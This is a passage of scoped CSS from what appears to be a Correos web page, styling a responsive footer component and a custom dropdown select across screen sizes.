			[size=lg].sc-correos-cdk-core-footer-h .cdk-container-white-img.sc-correos-cdk-core-footer {
				padding: 40px 0;
				padding-bottom: 40px;
				-ms-flex-wrap: nowrap;
				flex-wrap: nowrap
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-container-white-img__isNewsletter.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-container-white-img__isNewsletter.sc-correos-cdk-core-footer {
				padding: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer,
			[size=md].sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer {
				margin-right: 10px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 calc(40% - 10px);
				flex: 0 1 calc(40% - 10px);
				margin-bottom: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-pay-list.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-pay-list.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 calc(35% - 10px);
				flex: 0 1 calc(35% - 10px);
				margin-bottom: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 25%;
				flex: 0 1 25%
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-lite-footer.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-lite-footer.sc-correos-cdk-core-footer {
				padding: 24px;
				-ms-flex-wrap: nowrap;
				flex-wrap: nowrap
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-container-lite-footer.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-container-lite-footer.sc-correos-cdk-core-footer {
				width: calc(100% - 48px);
				padding-left: 40px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-image.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-image.sc-correos-cdk-core-footer {
				width: 48px;
				height: 48px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-contact.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-contact.sc-correos-cdk-core-footer {
				-ms-flex-direction: row;
				flex-direction: row;
				padding-top: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer {
				font-size: 16px;
				line-height: 24px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer {
				margin-right: 48px;
				padding-bottom: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer:last-child,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer:last-child {
				margin-right: 0;
				padding-bottom: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer {
				margin-top: 10px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
				padding: 24px 0 40px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-img.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				width: 200px;
				height: 200px;
				-ms-flex: 0 1 20%;
				flex: 0 1 20%
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 90%;
				flex: 0 1 90%
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-title.sc-correos-cdk-core-footer {
				margin: 0 24px;
				margin-top: 16px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 50%;
				flex: 0 1 50%;
				margin: 0 24px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 40%;
				flex: 0 1 40%
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer .cdk-newsletter-btn.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: start;
				justify-content: flex-start;
				margin-left: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-contact-section.sc-correos-cdk-core-footer {
				padding: 40px 16px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer {
				padding-top: 40px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer {
				padding-top: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer {
				font-size: 14px;
				line-height: 24px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer {
				margin-right: 32px
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
				padding: 40px 0
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
				-ms-flex-direction: column;
				flex-direction: column
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 50%;
				flex: 0 1 50%;
				margin-right: 32px;
				margin-bottom: 0
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 50%;
				flex: 0 1 50%
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-btn.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				margin-top: 24px;
				-ms-flex-pack: start;
				justify-content: flex-start
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-contact-section.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-footer-container__isNewsletter.sc-correos-cdk-core-footer {
				padding-bottom: 40px
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer {
				padding-top: 0
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-lite-footer.sc-correos-cdk-core-footer {
				padding: 16px 24px;
				-ms-flex-wrap: nowrap;
				flex-wrap: nowrap
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-container-lite-footer.sc-correos-cdk-core-footer {
				width: calc(100% - 40px);
				padding-left: 24px
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-contact.sc-correos-cdk-core-footer {
				-ms-flex-direction: row;
				flex-direction: row;
				padding-top: 0
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer {
				font-size: 12px;
				line-height: 18px
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer {
				margin-right: 16px;
				padding-bottom: 0
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer:last-child {
				margin-right: 0;
				padding-bottom: 0
			}

			[size=sm].sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer {
				margin-top: 10px
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
				padding: 48px 0 40px
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-img.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				width: 200px;
				height: 200px;
				-ms-flex: 0 1 18%;
				flex: 0 1 18%
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 80%;
				flex: 0 1 80%
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-title.sc-correos-cdk-core-footer {
				margin: 16px 32px 0 55px
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 50%;
				flex: 0 1 50%;
				margin: 0 32px 0 55px
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 60%;
				flex: 0 1 60%
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-fieldset.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex
			}

			[size=lg].sc-correos-cdk-core-footer-h .cdk-contact-section.sc-correos-cdk-core-footer {
				padding: 64px 40px
			}

			[variant=prepay].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer .cdk-prepay-section.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row;
				max-width: 100%;
				margin-bottom: 8px
			}

			@media (min-width: 1024px) {
				[variant=prepay].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer .cdk-prepay-section.sc-correos-cdk-core-footer {
					margin-right: 80px;
					max-width: 55%;
					margin-bottom: 0
				}
			}

			[variant=prepay].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer .cdk-prepay-section.sc-correos-cdk-core-footer .cdk-image.sc-correos-cdk-core-footer {
				margin-right: 16px
			}

			[variant=prepay].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer .cdk-prepay-section.sc-correos-cdk-core-footer .cdk-text.sc-correos-cdk-core-footer {
				font-size: 0.875rem;
				line-height: 1.375rem;
				color: var(--_cdk-core-footer-color-font-dark);
				font-weight: 300;
				display: block;
				width: 100%;
				padding-bottom: 16px
			}

			@media (min-width: 1024px) {
				[variant=prepay].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer .cdk-prepay-section.sc-correos-cdk-core-footer .cdk-text.sc-correos-cdk-core-footer {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			[variant=prepay].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer .cdk-prepay-vertical-container.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			[variant=prepay].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer .cdk-prepay-vertical-container.sc-correos-cdk-core-footer .cdk-link-list.sc-correos-cdk-core-footer {
				margin-top: 8px
			}
		</style>
		<style>
			@charset "UTF-8";

			.sc-correos-ui-custom-select-h {
				--_ui-custom-select-background-color: var(--ui-custom-select-background-color, white);
				--_ui-custom-select-box-shadow: var(--ui-custom-select-box-shadow, 0 10px 20px 0 rgba(0, 0, 0, 0.1));
				--_ui-custom-bg-select-default: var(--ui-custom-bg-select-default, #f3f2f2);
				--_ui-custom-label-color: var(--ui-custom-label-color, black);
				--_ui-custom-select-arrow-background: var(--ui-custom-select-arrow-background)
			}

			.sc-correos-ui-custom-select-h {
				display: block;
				position: relative;
				-webkit-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
				width: 100%
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				position: relative;
				display: -ms-flexbox;
				display: flex;
				height: 48px;
				width: 100%
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			@media (min-width: 640px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
					height: 56px
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select:focus {
				outline: none
			}

			.sc-correos-ui-custom-select-h .ui-container.focus-visible.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				border-width: 2px
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-label-float.sc-correos-ui-custom-select {
				font-size: 12px;
				line-height: 24px;
				color: var(--_ui-custom-label-color);
				position: absolute;
				top: 0;
				left: 16px;
				z-index: 1
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				position: relative;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between;
				padding: 0 16px;
				cursor: pointer;
				border: 1px solid #949494;
				border-bottom: 1.5px solid var(--_ui-custom-label-color);
				border-radius: 8px 8px 0 0;
				background-color: var(--_ui-custom-bg-select-default);
				height: 100%;
				width: 100%
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.light.sc-correos-ui-custom-select {
				background-color: var(--_ui-custom-select-background-color)
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
				font-size: 0.875rem;
				line-height: 1.375rem;
				color: var(--theme-color-strongGrey)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select {
				position: relative;
				height: 8px;
				width: 8px
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select::before,
			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select::after {
				content: "";
				position: absolute;
				bottom: 0px;
				width: 0.1rem;
				height: 100%;
				border-radius: 8px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select::before {
				left: -2px;
				-webkit-transform: rotate(-45deg);
				transform: rotate(-45deg);
				background-color: var(--_ui-custom-label-color)
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select::after {
				left: 2.5px;
				-webkit-transform: rotate(45deg);
				transform: rotate(45deg);
				background-color: var(--_ui-custom-label-color)
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				width: 100%;
				display: block;
				position: absolute;
				top: 100%;
				left: 0;
				right: 0;
				border: 1.5px solid var(--_ui-custom-label-color);
				border-top: 0;
				background: var(--theme-color-white-plain);
				-webkit-transition: all 0.3s;
				transition: all 0.3s;
				opacity: 0;
				height: 0;
				visibility: hidden;
				pointer-events: none;
				z-index: 15;
				border-radius: 0 0 8px 8px
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select:nth-child(2n) {
				background: #f9f8f8
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select:last-child {
				border-radius: 0 0 3px 3px
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-content.sc-correos-ui-custom-select:nth-child(2n) {
				background: var(--_ui-custom-select-background-color)
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				font-size: 0.875rem;
				line-height: 1.375rem;
				width: 100%;
				height: 100%;
				text-align: left;
				border: transparent solid;
				border-top: solid 1px var(--theme-color-softGrey);
				position: relative;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				padding: 16px;
				color: var(--theme-color-strongGrey);
				font-weight: 300;
				font-size: 14px;
				line-height: 22px
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select:active,
			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select:focus {
				outline: none
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select {
					font-size: 16px;
					line-height: 24px
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select .ui-description.sc-correos-ui-custom-select {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.75rem;
				line-height: 1.175rem;
				display: block;
				margin-top: 5px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select .ui-description.sc-correos-ui-custom-select {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select .ui-figure.sc-correos-ui-custom-select {
				margin: 0;
				padding: 0;
				border: 0;
				font-size: 100%;
				font: inherit;
				vertical-align: baseline;
				width: 100%;
				height: 100%;
				overflow: hidden
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section.sc-correos-ui-custom-select .ui-image.sc-correos-ui-custom-select {
				width: 100%;
				height: 100%
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section--with-description.sc-correos-ui-custom-select {
				-ms-flex-direction: column;
				flex-direction: column;
				-ms-flex-align: start;
				align-items: flex-start
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section--list-img.sc-correos-ui-custom-select {
				height: 64px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section--list-img.sc-correos-ui-custom-select {
					height: 96px
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section--list-img.sc-correos-ui-custom-select:hover {
				background-color: transparent
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section--list-img.sc-correos-ui-custom-select:active,
			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section--list-img.sc-correos-ui-custom-select:focus {
				outline: none
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-section--list-img.selected.sc-correos-ui-custom-select {
				border: 2px solid var(--theme-color-blue);
				border-radius: 8px;
				background-color: transparent
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				font-size: 0.875rem;
				line-height: 1.375rem;
				width: 100%;
				height: 100%;
				text-align: left;
				border: transparent solid;
				position: relative;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				padding: 0 16px;
				color: var(--_ui-custom-label-color);
				font-weight: 600;
				cursor: pointer;
				-webkit-transition: all 0.3s;
				transition: all 0.3s;
				font-size: 14px;
				line-height: 22px;
				border-width: 21px 0
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:hover,
			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.focus-visible.sc-correos-ui-custom-select {
				cursor: pointer;
				background-color: rgba(0, 46, 109, 0.1)
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:active,
			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:focus {
				outline: none
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
					font-size: 16px;
					line-height: 24px
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-description.sc-correos-ui-custom-select {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.75rem;
				line-height: 1.175rem;
				display: block;
				margin-top: 5px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-description.sc-correos-ui-custom-select {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-figure.sc-correos-ui-custom-select {
				margin: 0;
				padding: 0;
				border: 0;
				font-size: 100%;
				font: inherit;
				vertical-align: baseline;
				width: 100%;
				height: 100%;
				overflow: hidden
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-image.sc-correos-ui-custom-select {
				width: 100%;
				height: 100%;
				-o-object-fit: contain;
				object-fit: contain
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .icon.sc-correos-ui-custom-select {
				margin-right: 8px
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.selected.sc-correos-ui-custom-select {
				color: var(--theme-color-white-plain);
				background-color: var(--_ui-custom-label-color)
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option--with-description.sc-correos-ui-custom-select {
				-ms-flex-direction: column;
				flex-direction: column;
				-ms-flex-align: start;
				align-items: flex-start
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option--list-img.sc-correos-ui-custom-select {
				height: 64px
			}

			@media (max-width: 639px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option--list-img.sc-correos-ui-custom-select {
					border-width: 0
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option--list-img.sc-correos-ui-custom-select {
					height: 96px
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option--list-img.sc-correos-ui-custom-select:hover {
				background-color: transparent
